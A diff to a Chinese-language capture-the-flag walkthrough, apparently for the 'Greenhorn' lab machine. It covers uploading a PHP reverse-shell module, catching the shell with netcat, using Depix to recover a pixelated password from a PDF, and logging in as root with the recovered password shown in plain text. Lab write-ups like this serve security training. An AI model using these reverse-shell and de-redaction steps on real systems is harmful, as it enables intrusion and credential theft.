@@ -84,7 +84,7 @@ $port = 1234;       // CHANGE THIS
 [★]$ nc -lvnp 1234
 listening on [any] 1234 ...
 ```
-#### 在options->manage modules->Install a modules上传php-reverse-shell.zip 点击updata
+#### 在options->manage modules->Install a modules上传php-reverse-shell.zip 点击upload
 ```
 [★]$ nc -lvnp 1234
 listening on [any] 1234 ...
@@ -142,49 +142,41 @@ listening on [any] 1235 ...
 connect to [10.10.14.149] from (UNKNOWN) [10.129.231.80] 50036
 ^C
 [★]$ xdg-open 'Using OpenVAS.pdf'
+
+[★]$ pdftoppm -png 'Using OpenVAS.pdf' //因为是macOS 没有直接的 “Save Image As…” 选项
+```
+### 因为是macOS 没有直接的 “Save Image As…” 选项，在macOS用转换工具会丢像素，没用了，去windows吧
+```
+[★]$ xxd image-1.png | head -1  //这个命令确认.PNG
+00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
 ```
 ![内心平静是武器](images/091105.png)
 ### 去掉PDF文件的像素，工具Depix
 https://github.com/spipm/Depixelization_poc
 ```
-[★]$ git clone https://github.com/spipm/Depixelization_poc.git
-[★]$ cd Depixelization_poc
-[★]$ ls
-depixlib  depix_static.py  images   README.md              tool_show_boxes.py
-depix.py  docs             LICENSE  tool_gen_pixelated.py
-```
-#### 创建一个只包含像素化的图像文件,并排除pdf中的其余文本。
-#### 但 PDF 查看器里并不是“普通图片”，所以右键没有 Save image as...
-#### 将像素化pdf文件转化成图片png
-```
-[★]$ sudo apt install poppler-utils -y
-[★]$ pdftoppm -png 'Using OpenVAS.pdf' image-1
-```
-#### 就会生成image-1.png,存放的路径在Depixelization_poc
-```
-[★]$ chmod +x depix.py
-[★]$ ls images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
-images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+[★]$ git clone https://github.com/spipm/Depix.git
+[★]$ cd Depix
 [★]$ python3 depix.py -p image-1.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png
+```
+#### 但 PDF 查看器里并不是“普通图片”，所以右键没有 Save image as...
+#### 不需要转换，不需要剪裁，不需要很多工作，要使用windows的保存原图。。。。
+```
+可以这么理解：你在 macOS 上遇到的问题 表面上像是因为没有“Save Image As…”选项，但根本原因是 Depix 对像素块要求极其严格。
+在 macOS 上，即便你用 Preview 或 pdftoppm 转 PNG，生成的图片也可能：
+颜色略有偏差
+出现平滑/反锯齿
+像素大小或排列不完全一致
+这些微小变化就会导致 Depix 无法识别。
+Windows 提供的工具可以直接导出原始像素块 PNG，因此只是方便生成符合 Depix 要求的图片。
+所以，核心问题是 生成的 PNG 必须完全保留原始像素块特征，而不是 macOS 本身功能缺失。
 
-[★]$ xdg-open output.png
+好嘛 我就是不去windows，我难受,我一整天
+```
+```
+junior@greenhorn:~$ su root
+su root
+Password: sidefromsidetheothersidesidefromsidetheotherside
+
+root@greenhorn:~# cat root.txt
 ```
 
-```
-[★]$ identify -verbose output.png //查看图片大小
-Page geometry: 1241x1754+0+0
-[★]$ convert output.png -crop 500x50+300+450 image6.png
-[★]$ display image6.png
-
-[★]$ convert image6.png -type TrueColor image6_rgb.png
-[★]$ python3 depix.py -p image6_rgb.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output2.png
-
-[★]$ convert image-1.png -crop 450x50+300+450 image7.png
-[★]$ python3 depix.py -p image7.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output7.png
-```
-```
-identify -verbose image7_rgb.png | grep -E 'Type|Channels|Depth'
-Type 应该显示 TrueColor
-Channels 应该是 3
-Depth 通常是 8
-```
